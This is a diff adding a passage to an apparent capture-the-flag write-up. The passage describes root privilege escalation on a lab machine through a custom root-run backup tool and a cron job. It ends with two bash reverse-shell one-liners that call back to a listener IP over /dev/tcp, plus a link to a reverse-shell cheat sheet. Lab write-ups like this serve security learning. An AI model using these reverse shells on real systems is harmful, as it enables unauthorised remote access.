@@ -172,6 +172,44 @@ In that backup, most were the same aside from the db, which had 2 other user, we
 
 AND like that we have mark. PS. ssh is blocked for all for some reason. 
 
+<img width="685" height="615" alt="image" src="https://github.com/user-attachments/assets/27a7d9ef-4b17-4e71-b99c-82af5234ef38" />
+
+Now we run linpeas on the machine as mark, he can run charcol with root
+BUT WHAT IS CHARCOL, no idea till you read the introduction that its a custom thing for this box....
+
+<img width="1919" height="710" alt="image" src="https://github.com/user-attachments/assets/b312f444-7086-445e-9684-94f924d9c68e" />
+
+Cant login even with mark's password, time to hard reset it i guess? so i get the shell since the only options are help and shell. 
+
+<img width="1464" height="478" alt="image" src="https://github.com/user-attachments/assets/2f1bf5d3-38ef-420b-8852-7af052b3e725" />
+<img width="1101" height="309" alt="image" src="https://github.com/user-attachments/assets/89ac250d-6298-49ca-a935-34c8805b40ac" />
+
+Now theres the shell, along wit nice help menu. Im assuming i can directly backup the root folder but no. The zip was created but turned out to be empty. 
 
 
+<img width="1840" height="749" alt="image" src="https://github.com/user-attachments/assets/dd3ed358-6cd9-47d8-8ac6-77b64917d245" />
 
+<img width="772" height="352" alt="image" src="https://github.com/user-attachments/assets/fb912406-4494-4acb-a19a-5efa3b0f505d" />
+
+Since zipping the root directory doesnt work, time to do the hard way, cron job. And after a minute, the listener connected. 
+
+<img width="862" height="629" alt="image" src="https://github.com/user-attachments/assets/a723b805-338d-48e8-9fca-8005437f6af3" />
+
+Im may be late but i had fun. Also no idea why the ssh ports didnt work on this machine....
+
+ Takeaway: 
+
+1 did not work, 2 did, likely cuz cronjob's ```/bin/sh``` has issues with the syntax, so using 2 will ensure that it actually is running with bash. 
+
+1.
+Directly spawns an interactive bash shell with bash 
+
+ ```bash -i >& /dev/tcp/10.10.15.244/5555 0>&1```
+
+2.
+This one will spawn 1 bash shell (bash -c) to run the rest of the input  
+
+ ```bash -c 'bash -i >& /dev/tcp/10.10.15.244/5555 0>&1'```
+
+
+More shells : https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 
